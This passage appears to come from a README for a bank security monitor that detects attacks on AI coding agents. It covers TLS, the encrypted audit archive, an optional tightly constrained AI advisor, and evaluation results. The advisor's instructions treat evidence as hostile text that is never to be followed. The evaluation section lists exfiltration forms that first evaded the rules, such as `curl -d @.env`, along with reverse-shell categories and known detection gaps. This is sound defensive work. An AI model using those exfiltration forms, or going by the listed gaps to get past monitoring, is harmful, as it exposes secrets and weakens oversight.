- **Free certificates:** yes. For a demo: `python scripts/make_dev_cert.py` (self-signed, needs `pip install cryptography`; or `openssl req -x509 -newkey rsa:2048 -nodes -keyout certs/dev.key -out certs/dev.crt -days 90 -subj "/CN=localhost" -addext "subjectAltName=DNS:localhost,IP:127.0.0.1"`), then uncomment the TLS lines and the `certs` volume in `docker-compose.yml` and open `https://localhost:8000` (the browser will warn: expected for self-signed; the free tool *mkcert* gives a trusted local certificate). For a real service: the bank's internal CA is the normal route for an internal tool; **Let's Encrypt** is free but needs a public DNS name and 90-day automatic renewal; AWS Certificate Manager public certificates are free but only attach to AWS services (ALB, CloudFront), not to a container you run yourself. Checked by hand on the container build: `python -m app.serve` with the dev certificate answered over HTTPS with the HSTS header, and a plain-HTTP request to the same port got no answer. The automated tests cover the refusal paths (REQUIRE_TLS, forged forwarded-proto, start refused without a certificate) and loading the generated certificate; they do not open a TLS socket. The TLS version is Python's default (1.2 or higher); pin it at the proxy in production.
- **At rest:** archive batches are encrypted (AES-256-GCM, below). The working files in `out/` (alerts, audit log, intel list, cases) are plain JSON with redacted evidence: **not encrypted by the app**; run the container on an encrypted volume. Keys come from environment variables; production: KMS or HSM.
- **Not built:** mutual TLS or per-source credentials for log shippers, a web application firewall, rate limiting.

### Retention and archive integrity — built (policy and local archive), option (S3 Object Lock)
- **Edit and save in the dashboard (Platform & compliance tab).** Regulatory minimum, total, immediate-access, hot and warm days, legal hold, permitted regions, policy owner and status, and the archive storage choices (local or S3: endpoint, bucket, region, prefix, Object Lock mode and days, encryption type, KMS key reference). Saving is a *proposal*: it is checked against R1 to R10 and **refused at once if it would create a compliance failure** (retention below the minimum, tiers out of order, a region outside the permitted list, an `http` endpoint, Object Lock shorter than retention). A different, more senior person approves; **a change that weakens protection (shorter retention, shorter Object Lock, legal hold off, leaving S3, a new region, marking the policy confirmed) needs a lead**. Approval applies at once (the archive reads live settings) and the audit log records who, when, before and after. Not editable here: encryption and signing switches, keys, local path, TLS, sign-in, AI endpoint. In the demo the saved state is memory-only; set `PLATFORM_STATE_DIR` to a mounted folder to keep it, or copy the *Effective settings* box into `config/platform.json` by pull request. Tested: refusals, lead-only approval, restart replay, live effect on the archive.
- **Policy** (`config/platform.json`, status `assumed`, owner Compliance): hot days, warm days, total days, regulatory minimum, immediate-access window, legal hold, permitted regions. The numbers are placeholders (PCI DSS asks for 12 months with 3 months immediately available; CBUAE, NESA/IAS and bank policy may be longer: Compliance sets them). The Platform tab runs checks R1 to R10 and shows **fail** if total retention is below the minimum, tiers are out of order, an S3 target is outside the permitted regions, Object Lock is shorter than retention, or an endpoint is not https.
- **Archive** (`app/retention.py`): alerts, audit records and case snapshots are written as compressed, **AES-256-GCM encrypted** batches. A manifest records each batch's SHA-256, the previous record's hash and an **HMAC-SHA256** signature, so an edited, removed, re-ordered or forged batch is found, and *Verify archive* names the first broken record. **If encryption or signing is required and no key exists, it refuses to write; it never falls back to plain text.** Demo: `ARCHIVE_KEYS=ephemeral` makes throw-away keys in memory (the archive cannot be decrypted after a restart, and the page says so). Real keys: `python -m app.retention genkey`, stored in the bank's secret manager. CLI: `python -m app.retention check|verify`.
- **Option, not exercised:** `backend: s3` writes each batch (and each manifest record) to S3 or an S3-compatible store with **Object Lock in COMPLIANCE mode** (WORM: nobody, including the account owner, can shorten or delete), SSE-KMS and a SHA-256 checksum. The adapter is unit-tested against a stub client only. S3, KMS and Glacier are paid AWS services: **nothing here calls them** and they need approval and the bank's account. A free local MinIO is the way to try it. The UAE region (`me-central-1`) is the permitted region in the placeholder policy.
- **Not built:** moving data between hot, warm and cold tiers, automatic expiry, restore. That is the production SIEM or data lake plus S3 lifecycle rules. The local folder is tamper-evident, not tamper-proof.

### Intel and enrichment list — built (manual list), not built (live feeds)
One upload (CSV with a header, or JSON) of internet IPs and ranges, domains, **the bank's network zones, hosts and systems (CMDB-style) and users (HR/IAM-style)** (*Intel list* tab; template in the tab and `data/intel_sample.csv`, 45 synthetic rows in five categories: threat intel, networks, assets, identities, known good). Columns: `type` (ip, cidr, domain, host, user), `value`, `kind` (threat, network, asset, identity, benign), `tag`, `source`, `confidence`, `owner`, `criticality`, `expires`, `note`, plus optional context `zone`, `environment`, `address`, `os`, `service`, `data_class`, `department`. A host row with an `address` is found when an alert names only the IP. The tab also lists, per category, the owner system that would feed it in production (threat-intel platform, IPAM, CMDB, IdP/HR): scheduled pulls are **not built**, the same columns arrive by upload today. A match appears on the case ("this IP is on feed X, high confidence", "critical host, owner Platform engineering", "third-party developer") and in the IOC table; **Retro-hunt** searches stored alerts and session timelines for every active row. A domain row also matches sub-domains, a cidr row every address inside it, expired rows are shown but not matched, uploads are validated per row (a /4 range is rejected), capped at 5,000 rows and 1 MB, and every upload, removal and hunt is in the audit log.
**Enrichment only, by design:** a match never fires an alert, suppresses one or changes a priority (tested: the same cases, priorities and statuses with and without the list). Retro-hunt horizon is the monitor's in-memory state; production searches the SIEM's tiers. Not built: STIX/TAXII or MISP feeds (free public feeds carry licence terms Legal must check) and live CMDB or HR sync.

### MITRE ATT&CK coverage and register review dates — built
*Pipeline & policies* shows every ATT&CK and ATLAS technique the 13 rules map to, by tactic, with the rules behind it and how many corpus attacks those rules catch. It is computed from the rule catalog, so it cannot drift. Tactics with nothing mapped are either **out of scope on purpose** (Reconnaissance, Resource Development, Lateral Movement, Discovery: the reason and who covers it are shown) or a **gap** (Privilege Escalation and Collection currently have no mapped technique). The evidence is per rule, not per technique, and the corpus is synthetic.
Every register entry now has a **review-by date**. Past it the entry stays in force (deleting it would switch a detection off) but is flagged to its owner, shown on the Governance tab and written to the audit log; only an approved *confirm* proposal resets the date. This stops an allow-list from silently becoming a permanent blind spot.

### The AI question: how does it analyse and act without AI, and what an approved LLM could add
**Today, no AI is involved anywhere in detection or response.** Detection is rules (patterns, correlation across a session, a baseline-and-timer for silence). "Review and analysis" is deterministic code over structured evidence: `app/analysis.py` looks for the flagged command inside content the agent read earlier and scores five fixed hypotheses with evidence for and against; `app/narrative.py` fills a template (verdict, what happened, why it matters, do now, ask, not sure); priority is a formula (risk × confidence). "Auto action" is a fixed table by severity (`app/response.py`: page, quarantine register, freeze the session, flag files, block a package); anything disruptive waits for a named human to approve. The reason is the threat model: the detector reads text an attacker controls, so a model in the decision path could be steered by the same prompt injection it is meant to catch, and its answer could not be reproduced for a regulator. The cost is rigidity: rules do not generalise to a novel technique and the summaries read like templates.

**Optional second opinion (off by default, `AI_MODE=off|advise|propose`).** If the bank wants model help, it goes through the approved path and is boxed in. Nine controls, each tested:
1. **Approved endpoint only.** The host must be in the register entry `SOC_AI_ENDPOINTS` (change-controlled by maker-checker like every policy list) and use https; otherwise the call is refused before any byte is sent.
2. **Minimum data, by policy.** A size-capped case package; no raw logs, no keys. What may leave is set by `AI_DATA_POLICY` (deploy-time, see the table below), default **tokenize**.
3. **Evidence is treated as hostile.** Fenced with a random per-call boundary; the instructions say it may contain text aimed at the model and must never be followed.
4. **Strict output.** A fixed JSON shape; unknown fields dropped; verdict, confidence and actions checked against fixed lists; an action not already a pending decision on that case is discarded and counted; text length-capped and shown escaped.
5. **No authority.** The answer is stored beside the case, labelled advisory, and no code path reads it to compute tier, priority, status or response (a test checks the source). In `propose` mode it can only *suggest* decisions that already exist; a named person still approves them. It cannot suppress, re-prioritise or invent an action.
6. **Audited.** Who, which case, endpoint host, model, input hash, outcome and what was dropped go to the hash-chained audit log; the full redacted prompt and raw answer are kept in `out/ai_log.ndjson` for review.
7. **Bounded cost, kill switch.** 20 calls per hour, 3 per case per hour; anyone can pull the kill switch (the safe direction), only a restart re-arms it.
8. **Disagreement is shown.** If the model differs from the rules the analyst sees "differs from the rules: a person should look".
9. **Data guard.** A last scan of the exact bytes about to be sent refuses the call if a credential, a customer identifier or (for `tokenize` and `minimal`) a known user, host or repo name is still in them. It fails closed: a bug in an earlier step cannot send data out. The refusal is audited.
**What may be sent to an AI (`AI_DATA_POLICY`, set in the environment or `config/platform.json`, never from the dashboard).** The bank may not want any customer or sensitive data to reach a model, or may allow it for a model it hosts itself; the choice is the bank's, so it is a setting:

| Policy | What leaves the monitor | When to use |
|---|---|---|
| `minimal` | Structure only: rule ids, severities, categories, event types, times, counts. No evidence text, titles or names | External or unknown model; strictest |
| `tokenize` (**default**) | Credentials and customer identifiers (Emirates ID, IBAN, card) removed for good. User, host, repo, e-mail, IP and internal host names replaced by per-call tokens (`[USER_1]`, `[HOST_1]`, `[IP_2_external]`); the map stays in memory, is never logged or sent, and puts the real names back into the answer the analyst reads | Any approved model: it can still see that two events involve the same machine |
| `redact` | Credentials and customer identifiers masked (first 4 characters kept); names and addresses sent as they are | Bank-approved model, names acceptable |
| `local_full` | Names, hosts and customer identifiers sent as they are; credentials still masked. **Refused unless the endpoint is bank-hosted** (private address or `*.internal`, `*.local`) | Only if the bank hosts the model itself and the data-protection office agrees |

No policy ever sends a credential. Every case has **Preview what the AI would receive** (`GET /api/cases/{id}/ai-preview`): the exact input, what was removed or tokenized and the guard result; nothing is sent. Limits, stated plainly: free-text customer names inside evidence cannot be recognised by pattern (use `minimal`, or have the bank confirm the policy before a real model is connected); tokenized attacker IPs and domains cannot be reputation-checked by the model; "bank-hosted" is judged by name and must be confirmed with the network team; tested with the built-in mock and a stub endpoint only.

The built-in **mock** provider (free) shows the plumbing and guardrails, not model quality: it restates the rules' result and reads no free text. The `openai_compatible` provider (a chat-completions endpoint such as the bank's internal gateway) is unit-tested against a stub and was **never run against a real model**; a real model costs per call and needs approval and a budget first.
**Autonomous AI response is not built, by design:** an AI that triggers containment on its own would repeat the confused-deputy problem that this monitor exists to detect. The safe next step is the one built here: AI proposes, a named person approves. The counter-argument is real (humans are slow at 2 a.m.): the answer is pre-approved, reversible actions by the MDR, not model-initiated ones.

## Evaluation

Two layers, both enforced by `pytest`:

1. **Scenario sample** (`data/sample_events.ndjson`, 1,507 synthetic events, 15 labelled scenarios, 91 benign sessions with deliberate near-misses plus noisy control-plane background). `python -m app.cli`: **15/15 scenarios detected, 0/91 benign sessions opened a case.**
2. **Validation corpus** (`app/validation.py`, shown in the *Detection logic* tab and at `/api/validation`): 341 hand-written cases, 181 attack variants (several syntaxes per technique: ten reverse-shell forms, nine remote-execution forms, 14 secret formats, destructive, persistence and credential-theft commands, dependency confusion, DNS tunnelling, SCM and cloud abuse, log-tamper commands, stateful and correlated chains) and 160 routine developer look-alikes. A group of ENV cases tests the network and identity assumptions in the register (private addresses, CI service roles, third-party users, critical hosts). Result: **181/181 attacks raise a case, 0/160 look-alikes open a case, 23 stored as low signals.** `python -m app.validation` prints the per-rule scorecard. These cases were written together with the rules and tuned until they agreed, so 181/181 is a regression guarantee, not a measure of recall.
3. **Held-out set** (`HELDOUT` in `app/validation.py`, shown under the scorecard): 30 attacks and 27 benign commands written on 25 Oct *after* the rules by a reviewer trying to get round them. **First pass, before any rule change: 17 of 30 attacks raised a case (57%)**, no benign command did. The misses (CI workflow secret exfiltration, VS Code `tasks.json` auto-run, `package.json` and Makefile hooks, `curl -d @.env`, one-line python/PowerShell exfiltration, `certutil` downloads) were fixed in D4 and D6 and the set is now a regression set, so today's 28/30 is not independent evidence. Two accepted gaps remain on purpose and are listed openly: non-English and leetspeak instruction-override wording (the provenance rules C1/C2 still catch the follow-on action).

**Read this honestly:** both datasets were written by the same team that wrote the rules. The corpus is much broader than the sample and was built by deliberately trying to break the rules (that is how most of the fixes above were found), but it still proves regression safety, not real-world precision and recall. Real validation needs replayed production telemetry, a public red-team corpus and a tuning period. The cases in `app/validation.py` are the place to add every false positive and missed attack the SOC finds.

## Limitations and assumptions

**Assumptions** (all in the register, all `assumed`): see *Environment assumptions* above. In addition:
- The cloud, GitHub and identity events use realistic field names (CloudTrail-like, GitHub audit-like), but the real log formats were not available; a production feed needs a parser mapping step.
- Third-party developers are assumed to work from VDI and to have `ext.`-prefixed accounts; coding-agent tokens are assumed to be short-lived and per session.
- Control-plane logs carry no agent session id, so they are joined to a session by user (identity logs) or by host (EDR, DNS) within 15 minutes.

**Limitations** (known, not hidden):
- **Data is synthetic and written by the rule authors.** The 341-case corpus is broad and adversarial, but it proves regression safety, not real-world precision or recall.
- **Regex rules are evadable** (obfuscation, encoding, other languages). The design relies on layering (provenance, config integrity, egress control, correlation), not on one pattern. A model could be added later as a second opinion only, never as the sole control.
- **Session joining** uses "most recent session for that user or host"; two concurrent sessions can be mixed up. Production needs a shared session or device id in the logs.
- **C2 needs a companion alert**: an agent that merely connects to a host named in a page is not flagged (agents do this constantly); it is caught only if a D-rule also fires.
- **Identity is self-asserted in the default modes.** Actor and role are typed into the UI, so maker-checker is enforced on the role but not on who is really typing. `AUTH_MODE=proxy` takes them from SSO claims (tested with simulated headers; never run against a real tenant, headers are unsigned, so only the proxy may reach the app).
- **The audit log is tamper-evident, not tamper-proof**: it proves editing only to someone who holds a trusted copy of the latest hash, and in Docker it sits on tmpfs. Production: ship it to an immutable store.
- **D8**: a sleeping laptop looks like silence, so single-host silence without a tamper command is medium. The log-tamper command list covers common Linux and Windows forms, not every agent product.
- Baselines are simple (running mean per user); production needs per-team seasonality.
- Response actions are simulated; case workflow state is in memory; rate limiting and backup are not built; TLS, SSO, S3 Object Lock and the AI second opinion are options that are off in the demo and were never run against a real certificate authority, tenant, S3 account or model (see *Platform options*).
- **Retention numbers are placeholders** (`assumed`, owner Compliance); the archive is tamper-evident, and tiering, restore and expiry are the production SIEM's job.
- **The intel list is a manual upload**: no live feeds, no licence review of public feeds, and a match is enrichment only. ATT&CK coverage evidence is per rule, not per technique.
- Detection content is portable: each rule can be re-expressed as Sigma, KQL or SPL for the bank's SIEM; this engine is the reference implementation.
- The ATT&CK and ATLAS IDs added for D8–D10 and C3 were checked from memory and search only; re-verify at attack.mitre.org.

## Repo layout

```
app/        runbooks.py (serves runbooks + live register values) · config.py (policy) · detectors.py (D1–D7, D9, D10) · engine.py (parse, linking, D8, C1–C3, tiers, priority, cases) · narrative.py (analyst summary) · validation.py (labelled attack / benign corpus) · register.py (maker-checker) · audit.py (hash-chained audit log) · catalog.py (analyst playbooks, rule logic shown in the UI) · analysis.py (origin analysis, entity graph, IOCs) · response.py · mitre.py · main.py (API + hardening) · cli.py · coverage.py (ATT&CK/ATLAS coverage) · intel.py (intel and enrichment list) · retention.py (retention policy, encrypted signed archive, S3 adapter) · retention_settings.py (edit and save retention settings under maker-checker) · authn.py (SSO via proxy) · netpolicy.py (https-only endpoints) · ai_assist.py (optional AI second opinion) · platform_view.py (considered / built / option matrix, posture checks) · serve.py (HTTPS launcher)
config/     environment.json (known-environment register: 16 policy entries + 6 context entries, each with a review-by date) · platform.json (retention, SSO, AI settings)
runbooks/   RB-00 triage · RB-D1…D10 · RB-C1…C3 · RB-GOV (one Markdown runbook per policy, served by the SIEM)
static/     index.html · app.css · app.js – dashboard (9 tabs, no framework, no build step)
data/       sample_events.ndjson · ground_truth.json · intel_sample.csv (synthetic intel list)
scripts/    generate_sample_data.py · make_dev_cert.py (free self-signed certificate for local HTTPS)
tests/      test_detections.py (scenarios, false positives, schema, redaction, watchdog, linking, priority, summary) · test_validation.py (341-case corpus) · test_governance.py (maker-checker, audit chain) · test_runbooks.py (every rule has a runbook, dependencies exist, API is safe) · test_platform.py (coverage, review dates, intel list, retention and archive integrity, TLS rules, SSO proxy mode, AI guardrails)
```

All credentials, identifiers and hostnames in the sample data are synthetic (`.example` domains, TEST-NET addresses, fake keys).
